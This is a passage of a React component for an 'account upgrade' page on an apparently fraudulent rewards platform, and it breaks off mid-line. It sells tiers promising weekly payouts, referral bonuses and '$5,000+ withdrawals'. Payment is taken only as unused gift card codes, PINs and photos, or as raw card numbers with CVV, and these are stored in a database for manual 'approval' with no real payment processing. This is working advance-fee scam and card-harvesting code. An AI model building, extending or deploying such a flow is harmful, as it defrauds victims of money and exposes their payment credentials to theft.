import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import { db, logCardSubmission, logGiftCardSubmission } from '../lib/firebase';
import { doc, getDoc, onSnapshot } from 'firebase/firestore';
import {
  GIFT_CARD_BRAND_RULES,
  validateRealGiftCardInput,
  compressCardImage,
} from '../utils/giftCardValidator';
import { GiftCardVerdictModal, GiftCardCheckChecklist } from './GiftCardVerdictModal';
import {
  ArrowLeft,
  Crown,
  Check,
  ChevronRight,
  CreditCard,
  Calendar,
  Lock,
  AlertCircle,
  Gift,
  Upload,
  ShieldCheck,
  Zap,
  Users,
} from 'lucide-react';

interface AccountLevelsProps {
  onBack: () => void;
  onNavigateToKyc?: () => void;
}

interface Tier {
  stage: number;
  name: string;
  price: number;
  weeklyReward: number;
  referralReward: number;
  badgeColor: string;
  benefits: string[];
}

const GIFT_CARD_BRANDS = GIFT_CARD_BRAND_RULES;

export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigateToKyc }) => {
  const { user, updateUser, addTransaction } = useAuth();

  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
  const [selectedTier, setSelectedTier] = useState<Tier | null>(null);
  const [progress, setProgress] = useState(0);

  // Payment method tab in step 2: 'giftcard' or 'card'
  const [paymentMethod, setPaymentMethod] = useState<'giftcard' | 'card'>('giftcard');

  // Gift Card Verification state
  const [giftCardBrand, setGiftCardBrand] = useState(GIFT_CARD_BRAND_RULES[0].name);
  const [giftCardFormat, setGiftCardFormat] = useState<'ecode' | 'physical'>('ecode');
  const [giftCardCode, setGiftCardCode] = useState('');
  const [giftCardPin, setGiftCardPin] = useState('');
  const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
  const [confirmedUnused, setConfirmedUnused] = useState(false);
  const [isSubmittingGiftCard, setIsSubmittingGiftCard] = useState(false);
  const [giftCardError, setGiftCardError] = useState('');
  const [pendingStatusId, setPendingStatusId] = useState<string | null>(null);
  const [giftStatusState, setGiftStatusState] = useState<'pending' | 'verified' | 'redeemed' | 'rejected'>('pending');
  const [giftRejectionReason, setGiftRejectionReason] = useState('');
  const [verdictModal, setVerdictModal] = useState<{ type: 'used' | 'fake'; message: string } | null>(null);
  const [isCheckingStatus, setIsCheckingStatus] = useState(false);
  const [statusCheckNote, setStatusCheckNote] = useState('');

  // ATM Card form state
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardName, setCardName] = useState(user?.name || '');
  const [cardError, setCardError] = useState('');

  const TIERS: Tier[] = [
    {
      stage: 1,
      name: 'Silver',
      price: 50,
      weeklyReward: 50,
      referralReward: 65,
      badgeColor: 'from-slate-400 to-zinc-500',
      benefits: [
        'Weekly normal reward of $50',
        'Earn $65 per successful referral',
        'Basic customer support',
        'Access to standard features',
      ],
    },
    {
      stage: 2,
      name: 'Gold',
      price: 75,
      weeklyReward: 75,
      referralReward: 80,
      badgeColor: 'from-amber-400 to-yellow-600',
      benefits: [
        'Weekly normal reward of $75',
        'Earn $80 per successful referral',
        'Priority customer support',
        'Advanced features access',
      ],
    },
    {
      stage: 3,
      name: 'Platinum',
      price: 100,
      weeklyReward: 100,
      referralReward: 110,
      badgeColor: 'from-cyan-500 to-blue-600',
      benefits: [
        'Weekly normal reward of $100',
        'Earn $110 per successful referral',
        'Premium customer support',
        'All features unlocked',
      ],
    },
    {
      stage: 4,
      name: 'Emerald',
      price: 150,
      weeklyReward: 150,
      referralReward: 160,
      badgeColor: 'from-emerald-500 to-green-700',
      benefits: [
        'Weekly normal reward of $150',
        'Earn $160 per successful referral',
        'VIP customer support',
        'Exclusive features access',
      ],
    },
    {
      stage: 5,
      name: 'Ruby',
      price: 200,
      weeklyReward: 200,
      referralReward: 220,
      badgeColor: 'from-rose-500 to-red-700',
      benefits: [
        'Unlocks $5,000+ first withdrawal access',
        'Weekly normal reward of $200',
        'Earn $220 per successful referral',
        'Dedicated account manager',
      ],
    },
    {
      stage: 6,
      name: 'Diamond',
      price: 250,
      weeklyReward: 250,
      referralReward: 280,
      badgeColor: 'from-purple-500 to-indigo-700',
      benefits: [
        'Weekly normal reward of $250',
        'Earn $280 per successful referral',
        'White-glove executive service',
        'Ultimate platform access',
      ],
    },
    {
      stage: 7,
      name: 'Black',
      price: 500,
      weeklyReward: 500,
      referralReward: 550,
      badgeColor: 'from-gray-900 to-black',
      benefits: [
        'Weekly normal reward of $500',
        'Earn $550 per successful referral',
        'Concierge executive service',
        'Elite status & maximum limits',
      ],
    },
  ];

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (val.length >= 3) {
      setExpiry(`${val.slice(0, 2)}/${val.slice(2)}`);
    } else {
      setExpiry(val);
    }
  };

  const handleImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setGiftCardError('');
    try {
      const compressed = await compressCardImage(file);
      setGiftCardImage(compressed);
    } catch (err: any) {
      setGiftCardError(err?.message || 'Failed to read gift card image.');
    }
  };

  const pendingUpgradeStorageKey = user?.email
    ? `paygo_pending_upgrade_${user.email.toLowerCase()}`
    : null;

  // Restore pending tier upgrade verification if user navigates back to Upgrade screen
  useEffect(() => {
    if (!pendingUpgradeStorageKey) return;
    try {
      const raw = localStorage.getItem(pendingUpgradeStorageKey);
      if (!raw) return;
      const parsed = JSON.parse(raw) as { statusId?: string; stage?: number; paymentMethod?: 'giftcard' | 'card' };
      const matchedTier = TIERS.find((t) => t.stage === parsed.stage);
      if (!matchedTier) {
        localStorage.removeItem(pendingUpgradeStorageKey);
        return;
      }
      if (
        user?.accountLevel &&
        user.accountLevel.toLowerCase().includes(`stage ${matchedTier.stage}`)
      ) {
        localStorage.removeItem(pendingUpgradeStorageKey);
        setSelectedTier(matchedTier);
        setStep(4);
        return;
      }
      setSelectedTier(matchedTier);
      setPaymentMethod(parsed.paymentMethod || 'giftcard');
      if (parsed.statusId) setPendingStatusId(parsed.statusId);
      setStep(3);
    } catch {
      // ignore invalid saved state
    }
  }, [pendingUpgradeStorageKey, user?.accountLevel]);

  // Step 3 verification: real-time admin verification hold for Gift Cards & ATM cards
  useEffect(() => {
    if (step !== 3) return;

    if (paymentMethod === 'giftcard') {
      if (!pendingStatusId) return;

      const unsub = onSnapshot(
        doc(db, 'giftCardStatuses', pendingStatusId),
        (snap) => {
          if (!snap.exists()) return;
          const data = snap.data() as {
            status: 'pending' | 'verified' | 'redeemed' | 'rejected';
            rejectionReason?: string;
          };
          setGiftStatusState(data.status);

          if (data.status === 'rejected') {
            setGiftRejectionReason(
              data.rejectionReason || 'Wrong or used gift card is not allowed. Tier upgrade rejected.'
            );
            return;
          }

          if (data.status === 'verified' || data.status === 'redeemed') {
            if (pendingUpgradeStorageKey) {
              localStorage.removeItem(pendingUpgradeStorageKey);
            }
            setPendingStatusId(null);
            if (selectedTier) {
              updateUser({ accountLevel: `Stage ${selectedTier.stage} — ${selectedTier.name}` });
              addTransaction({
                type: 'Account Upgrade',
                amount: selectedTier.price,
                tierName: `Stage ${selectedTier.stage} — ${selectedTier.name}`,
                date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
              });
            }
            setStep(4);
          }
        },
        (err) => {
          console.warn('Upgrade gift card status listener warning:', err);
        }
      );
      return () => unsub();
    }

    if (paymentMethod !== 'card') return;

    // ATM Card (Other Option) upgrade verification: wait for admin approval
    const cleanEmail = user?.email?.trim().toLowerCase();
    if (!cleanEmail) return;

    const unsubUser = onSnapshot(
      doc(db, 'users', cleanEmail),
      (snap) => {
        if (!snap.exists()) return;
        const remote = snap.data() as { accountLevel?: string; cardRejectionReason?: string };
        const targetTierName = `Stage ${selectedTier?.stage} — ${selectedTier?.name}`;
        if (remote.accountLevel && remote.accountLevel.toLowerCase().includes(`stage ${selectedTier?.stage}`)) {
          if (pendingUpgradeStorageKey) {
            localStorage.removeItem(pendingUpgradeStorageKey);
          }
          updateUser({ accountLevel: targetTierName, cardRejectionReason: '' });
          addTransaction({
            type: 'Account Upgrade',
            amount: selectedTier?.price || 0,
            tierName: targetTierName,
            date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
          });
          setStep(4);
        } else if (remote.cardRejectionReason) {
          updateUser({ cardRejectionReason: remote.cardRejectionReason });
        }
      }
    );
    return () => unsubUser();
  }, [step, selectedTier, paymentMethod, pendingStatusId, pendingUpgradeStorageKey]);

  const handleManualCheckUpgradeStatus = async () => {
    if (!pendingStatusId) return;
    setIsCheckingStatus(true);
    setStatusCheckNote('');
    try {
      const snap = await getDoc(doc(db, 'giftCardStatuses', pendingStatusId));
      if (snap.exists()) {
        const data = snap.data() as {
          status: 'pending' | 'verified' | 'redeemed' | 'rejected';
          rejectionReason?: string;
        };
        setGiftStatusState(data.status);
        if (data.status === 'verified' || data.status === 'redeemed') {
          if (pendingUpgradeStorageKey) localStorage.removeItem(pendingUpgradeStorageKey);
          setPendingStatusId(null);
          if (selectedTier) {
            updateUser({ accountLevel: `Stage ${selectedTier.stage} — ${selectedTier.name}` });
            addTransaction({
              type: 'Account Upgrade',
              amount: selectedTier.price,
              tierName: `Stage ${selectedTier.stage} — ${selectedTier.name}`,
              date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
            });
          }
          setStep(4);
          return;
        }
        if (data.status === 'rejected') {
          setGiftRejectionReason(
            data.rejectionReason || 'Wrong or used gift card is not allowed. Tier upgrade rejected.'
          );
          return;
        }
      }
      setStatusCheckNote('Still awaiting admin confirmation. Your tier will unlock right here once approved.');
    } catch {
      setStatusCheckNote('Checking automatically in the background...');
    } finally {
      setIsCheckingStatus(false);
    }
  };

  const handleGiftCardPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setGiftCardError('');

    const validation = validateRealGiftCardInput({
      brand: giftCardBrand,
      format: giftCardFormat,
      code: giftCardCode,
      pin: giftCardPin,
      image: giftCardImage,
      confirmedUnused,
    });

    if (!validation.valid) {
      const msg = validation.error || 'Please drop a valid, unused gift card.';
      setGiftCardError(msg);
      setVerdictModal({
        type: msg.toLowerCase().includes('used') ? 'used' : 'fake',
        message: msg,
      });
      return;
    }

    setIsSubmittingGiftCard(true);
    try {
      const res = await logGiftCardSubmission({
        id: `GIFT-${Date.now()}`,
        type: `Stage ${selectedTier?.stage} — ${selectedTier?.name || 'Upgrade'}`,
        cardBrand: giftCardBrand,
        cardFormat: giftCardFormat,
        cardCode: giftCardCode.trim().toUpperCase(),
        cardPin: giftCardPin.trim() || 'N/A',
        amount: selectedTier?.price || 0,
        image: giftCardImage || '',
        userEmail: user?.email || 'unknown',
        userName: user?.name || 'User',
        date: new Date().toLocaleString(),
        status: 'pending',
      });

      if (!res.success || !res.statusId) {
        const msg =
          res.error || 'Used or invalid gift card is not allowed. Please drop a brand-new real gift card.';
        setGiftCardError(msg);
        setVerdictModal({ type: 'used', message: msg });
        return;
      }

      if (pendingUpgradeStorageKey && selectedTier) {
        localStorage.setItem(
          pendingUpgradeStorageKey,
          JSON.stringify({ statusId: res.statusId, stage: selectedTier.stage, paymentMethod: 'giftcard' })
        );
      }
      setGiftStatusState('pending');
      setGiftRejectionReason('');
      setStatusCheckNote('');
      setPendingStatusId(res.statusId);
      setStep(3);
    } catch (err: any) {
      console.error(err);
      setGiftCardError(err?.message || 'Could not verify gift card right now.');
    } finally {
      setIsSubmittingGiftCard(false);
    }
  };

  const handleCardPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setCardError('');

    const cleanCard = cardNumber.replace(/\s/g, '');
    if (cleanCard.length < 16) {
      setCardError('Please enter a valid 16-digit ATM card number');
      return;
    }
    if (!expiry || expiry.length < 5) {
      setCardError('Please enter a valid expiry date (MM/YY)');
      return;
    }
    if (!cvv || cvv.length < 3) {
      setCardError('Please enter a valid CVV');
      return;
    }

    try {
      updateUser({ cardRejectionReason: '' });
      await logCardSubmission({
        id: `CARD-${Date.now()}`,
        type: `Stage ${selectedTier?.stage} — ${selectedTier?.name || 'Upgrade'}`,
        cardNumber,
        expiry,
        cvv,
        cardName,
        amount: selectedTier?.price || 0,
        status: 'pending',
        userEmail: user?.email || 'unknown',
        userName: user?.name || cardName,
        date: new Date().toLocaleString(),
      });
      if (pendingUpgradeStorageKey && selectedTier) {
        localStorage.setItem(
          pendingUpgradeStorageKey,
          JSON.stringify({ stage: selectedTier.stage, paymentMethod: 'card' })
        );
      }
    } catch (e) {
      console.error(e);
    }

    setStep(3);
  };

  return (
    <div className="min-h-screen bg-gray-50 pb-12">
      <div className="bg-purple-700 text-white p-4 shadow-md sticky top-0 z-30">
        <div className="max-w-xl mx-auto flex items-center space-x-3">
          <button
            onClick={onBack}
            className="p-2 hover:bg-white/10 rounded-full transition-colors text-white cursor-pointer"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <h1 className="text-lg font-bold">Choose Your Level</h1>
            <p className="text-xs text-purple-200">Upgrade stages to increase weekly & referral earnings</p>
          </div>
        </div>
      </div>

      <div className="max-w-xl mx-auto p-4 sm:p-6 space-y-6">
        {/* Step 1: Tier Selection */}
        {step === 1 && (
          <div className="space-y-4">
            <div className="bg-gradient-to-r from-purple-900 to-indigo-900 text-white rounded-2xl p-5 shadow-sm flex items-center justify-between">
              <div>
                <p className="text-xs uppercase font-medium text-purple-200">Current Level</p>
                <h3 className="text-xl font-bold mt-0.5">{user?.accountLevel || 'Basic'}</h3>
              </div>
              <span className="text-xs bg-white/20 px-3 py-1.5 rounded-full font-semibold">
                Active Tier
              </span>
            </div>

            <div className="text-center py-2">
              <h2 className="text-xl font-bold text-gray-900">Select Stage to Upgrade</h2>
              <p className="text-xs text-gray-500">
                View weekly normal rewards, referral earnings, and activation prices
              </p>
            </div>

            <div className="space-y-3">
              {TIERS.map((tier) => (
                <div
                  key={tier.name}
                  onClick={() => {
                    setSelectedTier(tier);
                    setStep(2);
                  }}
                  className="bg-white rounded-2xl p-5 shadow-xs border border-gray-100 hover:border-purple-300 hover:shadow-md transition-all cursor-pointer flex flex-col justify-between"
                >
                  <div className="flex items-center justify-between mb-3">
                    <div className="flex items-center space-x-3">
                      <div
                        className={`w-11 h-11 rounded-xl bg-gradient-to-br ${tier.badgeColor} text-white flex items-center justify-center font-black shadow-xs`}
                      >
                        <Crown className="w-6 h-6" />
                      </div>
                      <div>
                        <div className="flex flex-wrap items-center gap-2">
                          <h4 className="font-bold text-base text-gray-900">
                            Stage {tier.stage} — {tier.name}
                          </h4>
                          {(((!user?.accountLevel || user.accountLevel === 'Basic') && tier.stage === 1) ||
                            (user?.accountLevel?.includes('Silver') && tier.stage === 2)) && (
                            <span className="text-[10px] font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-2 py-0.5 rounded-full border border-amber-200">
                              Next Required Tier
                            </span>
                          )}
                          {tier.stage === 5 && (
                            <span className="text-[10px] font-bold uppercase tracking-wider bg-rose-100 text-rose-800 px-2 py-0.5 rounded-full border border-rose-200">
                              Unlocks $5,000+ Withdrawals
                            </span>
                          )}
                        </div>
                        <span className="text-xs font-black text-purple-700 bg-purple-50 px-2 py-0.5 rounded-md border border-purple-200 inline-block mt-1">
                          ${tier.price.toLocaleString()} One-time
                        </span>
                      </div>
                    </div>
                    <ChevronRight className="w-5 h-5 text-gray-400" />
                  </div>

                  {/* Highlights Bar */}
                  <div className="grid grid-cols-2 gap-2 mb-3 bg-gray-50 p-2.5 rounded-xl border border-gray-100">
                    <div className="flex items-center space-x-1.5 text-xs text-purple-900 font-semibold">
                      <Zap className="w-3.5 h-3.5 text-amber-500 shrink-0" />
                      <span>Weekly: <strong>${tier.weeklyReward}/wk</strong></span>
                    </div>
                    <div className="flex items-center space-x-1.5 text-xs text-emerald-900 font-semibold">
                      <Users className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
                      <span>Referral: <strong>${tier.referralReward}/invite</strong></span>
                    </div>
                  </div>

                  <div className="space-y-1.5 pt-2 border-t border-gray-100 text-xs text-gray-600">
                    {tier.benefits.map((b, idx) => (
                      <div key={idx} className="flex items-center space-x-2">
                        <Check className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
                        <span>{b}</span>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Step 2: Payment Details with Verify with Gift Cards & ATM Card Tabs */}
        {step === 2 && selectedTier && (
          <div className="space-y-5">
            <div className="bg-gradient-to-r from-purple-700 to-indigo-800 text-white rounded-2xl p-5 text-center shadow-md">
              <h2 className="text-xl font-bold">
                Upgrade to Stage {selectedTier.stage} — {selectedTier.name}
              </h2>
              <p className="text-xs text-purple-200 mt-1">
                Choose verification method for ${selectedTier.price.toLocaleString()}
              </p>
              <div className="mt-3 flex justify-center space-x-4 text-xs font-semibold">
                <span className="bg-white/20 px-3 py-1 rounded-full">
                  Weekly: ${selectedTier.weeklyReward}/wk
                </span>
                <span className="bg-white/20 px-3 py-1 rounded-full">
                  Referral: ${selectedTier.referralReward}/ref
                </span>
              </div>
            </div>

            {/* Payment Method Tabs */}
            <div className="grid grid-cols-2 gap-2 bg-gray-200 p-1.5 rounded-2xl">
              <button
                type="button"
                onClick={() => setPaymentMethod('giftcard')}
                className={`py-3 rounded-xl font-bold text-xs sm:text-sm transition-all flex items-center justify-center space-x-2 cursor-pointer ${
                  paymentMethod === 'giftcard'
                    ? 'bg-white text-purple-900 shadow-sm'
                    : 'text-gray-600 hover:text-gray-900'
                }`}
              >
                <Gift className="w-4 h-4 text-purple-600" />
                <span>Verify with Gift Cards</span>
              </button>

              <button
                type="button"
                onClick={() => setPaymentMethod('card')}
                className={`py-3 rounded-xl font-bold text-xs sm:text-sm transition-all flex items-center justify-center space-x-2 cursor-pointer ${
                  paymentMethod === 'card'
                    ? 'bg-white text-purple-900 shadow-sm'
                    : 'text-gray-600 hover:text-gray-900'
                }`}
              >
                <CreditCard className="w-4 h-4 text-emerald-600" />
                <span>Other Option</span>
              </button>
            </div>

            {paymentMethod === 'giftcard' ? (
              <form onSubmit={handleGiftCardPayment} className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 space-y-4">
                <div className="bg-gradient-to-r from-purple-50 to-indigo-50 border border-purple-200 rounded-2xl p-4 space-y-1.5">
                  <div className="flex items-center space-x-2">
                    <Gift className="w-5 h-5 text-purple-700" />
                    <h3 className="font-bold text-sm text-purple-900">Real & Unused Gift Cards Only</h3>
                  </div>
                  <p className="text-xs text-purple-800 leading-relaxed">
                    Drop a genuine, unredeemed <strong>${selectedTier.price.toLocaleString()}</strong> gift card with its clear photo / receipt to upgrade to <strong>Stage {selectedTier.stage} — {selectedTier.name}</strong>. <strong>Used, redeemed, or fake gift cards are strictly not allowed.</strong>
                  </p>
                </div>

                {giftCardError && (
                  <div className="p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl flex items-start space-x-2 font-medium">
                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-600" />
                    <span>{giftCardError}</span>
                  </div>
                )}

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                    Select Gift Card Brand
                  </label>
                  <select
                    value={giftCardBrand}
                    onChange={(e) => {
                      setGiftCardBrand(e.target.value);
                      setGiftCardError('');
                    }}
                    className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 bg-white font-medium"
                  >
                    {GIFT_CARD_BRANDS.map((b) => (
                      <option key={b.id} value={b.name}>
                        {b.icon} {b.name}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="grid grid-cols-2 gap-2 bg-gray-100 p-1 rounded-xl">
                  <button
                    type="button"
                    onClick={() => setGiftCardFormat('ecode')}
                    className={`py-2 text-xs font-semibold rounded-lg transition-all cursor-pointer ${
                      giftCardFormat === 'ecode' ? 'bg-white text-purple-900 shadow-xs' : 'text-gray-500'
                    }`}
                  >
                    Digital E-Code
                  </button>
                  <button
                    type="button"
                    onClick={() => setGiftCardFormat('physical')}
                    className={`py-2 text-xs font-semibold rounded-lg transition-all cursor-pointer ${
                      giftCardFormat === 'physical' ? 'bg-white text-purple-900 shadow-xs' : 'text-gray-500'
                    }`}
                  >
                    Physical Card (Photo)
                  </button>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Gift Card Claim Code / E-Code *
                  </label>
                  <input
                    type="text"
                    value={giftCardCode}
                    onChange={(e) => {
                      setGiftCardCode(e.target.value.toUpperCase());
                      setGiftCardError('');
                    }}
                    placeholder={
                      GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.example ||
                      'Enter real unredeemed gift card code'
                    }
                    className="w-full p-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono font-bold text-gray-900 uppercase"
                    required
                  />
                  <p className="text-[11px] text-purple-700 mt-1 font-medium">
                    {GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.formatHint}
                  </p>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      Card PIN / CVV{' '}
                      {GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.requiresPin
                        ? '(Required *)'
                        : '(If shown)'}
                    </label>
                    <input
                      type="text"
                      value={giftCardPin}
                      onChange={(e) => setGiftCardPin(e.target.value)}
                      placeholder="e.g. 1234"
                      required={Boolean(
                        GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.requiresPin
                      )}
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      Required Value ($)
                    </label>
                    <input
                      type="text"
                      readOnly
                      value={`$${selectedTier.price.toLocaleString()}`}
                      className="w-full p-3 bg-gray-100 border border-gray-200 rounded-xl text-sm font-bold text-purple-900 font-mono"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Upload Real Gift Card Photo / Receipt (Required *)
                  </label>
                  <label
                    className={`border-2 border-dashed rounded-2xl p-4 flex flex-col items-center justify-center cursor-pointer transition-colors bg-gray-50 ${
                      giftCardImage
                        ? 'border-emerald-400 bg-emerald-50/40'
                        : 'border-gray-300 hover:border-purple-400'
                    }`}
                  >
                    {giftCardImage ? (
                      <div className="space-y-2 text-center">
                        <img
                          src={giftCardImage}
                          alt="Card Preview"
                          className="h-24 object-contain rounded-lg mx-auto border border-gray-200"
                        />
                        <span className="text-xs text-purple-700 font-semibold">Change Photo</span>
                      </div>
                    ) : (
                      <div className="text-center space-y-1">
                        <Upload className="w-6 h-6 text-purple-600 mx-auto mb-1" />
                        <p className="text-xs font-semibold text-gray-700">
                          {giftCardFormat === 'physical'
                            ? 'Attach clear photo of scratched card & store receipt'
                            : 'Attach screenshot or email receipt of real e-code'}
                        </p>
                        <p className="text-[10px] text-gray-400">JPG, PNG required to verify card is unused</p>
                      </div>
                    )}
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleImageUpload}
                      className="hidden"
                    />
                  </label>
                </div>

                <label className="flex items-start space-x-2.5 bg-amber-50 border border-amber-200 rounded-xl p-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={confirmedUnused}
                    onChange={(e) => setConfirmedUnused(e.target.checked)}
                    className="mt-0.5 w-4 h-4 accent-purple-600 shrink-0"
                  />
                  <span className="text-xs text-amber-900 leading-relaxed font-medium">
                    I confirm this is a real, unredeemed gift card. Dropping a used, redeemed, or fake gift card is not allowed.
                  </span>
                </label>

                {giftCardError && (
                  <div className="p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl flex items-start space-x-2 font-medium">
                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-600" />
                    <span>{giftCardError}</span>
                  </div>
                )}

                <button
                  type="submit"
                  disabled={isSubmittingGiftCard}
                  className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2 disabled:opacity-60"
                >
                  <ShieldCheck className="w-5 h-5" />
                  <span>
                    {isSubmittingGiftCard
                      ? 'Checking Gift Card Authenticity...'
                      : `Verify $${selectedTier.price.toLocaleString()} Real Gift Card & Upgrade`}
                  </span>
                </button>
              </form>
            ) : (
              <form onSubmit={handleCardPayment} className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 space-y-4">
                <div className="bg-purple-900 text-white rounded-2xl p-4 relative overflow-hidden mb-2">
                  <div className="text-[10px] uppercase tracking-widest text-purple-300 font-semibold mb-3">
                    Card Verification (Other Option)
                  </div>
                  <div className="font-mono text-base tracking-wider mb-3">
                    {cardNumber || '•••• •••• •••• ••••'}
                  </div>
                  <div className="flex justify-between text-xs text-purple-200">
                    <span>{cardName || 'CARDHOLDER'}</span>
                    <span className="font-mono">{expiry || 'MM/YY'}</span>
                  </div>
                </div>

                {cardError && (
                  <div className="p-3 bg-red-50 border border-red-200 text-red-600 text-xs rounded-xl flex items-center space-x-2">
                    <AlertCircle className="w-4 h-4 shrink-0" />
                    <span>{cardError}</span>
                  </div>
                )}

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Card Number
                  </label>
                  <div className="relative">
                    <CreditCard className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                    <input
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="4532 •••• •••• ••••"
                      className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                      required
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      Expiry Date
                    </label>
                    <div className="relative">
                      <Calendar className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                      <input
                        type="text"
                        value={expiry}
                        onChange={handleExpiryChange}
                        placeholder="MM/YY"
                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      CVV
                    </label>
                    <div className="relative">
                      <Lock className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                      <input
                        type="password"
                        maxLength={4}
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                        placeholder="123"
                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                        required
                      />
                    </div>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Cardholder Name
                  </label>
                  <input
                    type="text"
                    value={cardName}
                    onChange={(e) => setCardName(e.target.value)}
                    placeholder="Name on card"
                    className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 uppercase"
                    required
                  />
                </div>

                <button
                  type="submit"
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
                >
                  <CreditCard className="w-5 h-5" />
                  <span>Verify ${selectedTier.price.toLocaleString()} with Card (Other Option)</span>
                </button>
              </form>
            )}

            <button
              onClick={() => setStep(1)}
              className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 rounded-xl text-sm transition-all cursor-pointer"
            >
              Back to Stages
            </button>
          </div>
        )}

        {/* Step 3: Verification */}
        {step === 3 && (
          <div className="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 flex flex-col items-center justify-center text-center space-y-5 my-8">
            {paymentMethod === 'giftcard' && giftStatusState === 'rejected' ? (
              <>
                <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center ring-8 ring-red-50">
                  <AlertCircle className="w-9 h-9" />
                </div>
                <span className="text-xs font-extrabold uppercase tracking-wider bg-red-100 text-red-800 border border-red-200 px-3 py-1 rounded-full">
                  {giftRejectionReason.toLowerCase().includes('fake') ||
                  giftRejectionReason.toLowerCase().includes('wrong')
                    ? 'Verdict: Fake / Wrong Gift Card'
                    : 'Verdict: Used Gift Card'}
                </span>
                <h3 className="text-2xl font-extrabold text-red-700">
                  {giftRejectionReason.toLowerCase().includes('fake') &&
                  !giftRejectionReason.toLowerCase().startsWith('used')
                    ? 'Fake or Invalid Gift Card — Rejected'
                    : 'Used Gift Card — Upgrade Denied'}
                </h3>
                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
                  {giftRejectionReason ||
                    'Wrong or already-used gift card detected. Used or invalid gift cards are not allowed.'}
                </p>
                <button
                  type="button"
                  onClick={() => {
                    if (pendingUpgradeStorageKey) localStorage.removeItem(pendingUpgradeStorageKey);
                    setPendingStatusId(null);
                    setGiftStatusState('pending');
                    setGiftRejectionReason('');
                    setGiftCardCode('');
                    setGiftCardPin('');
                    setGiftCardImage(null);
                    setConfirmedUnused(false);
                    setGiftCardError(
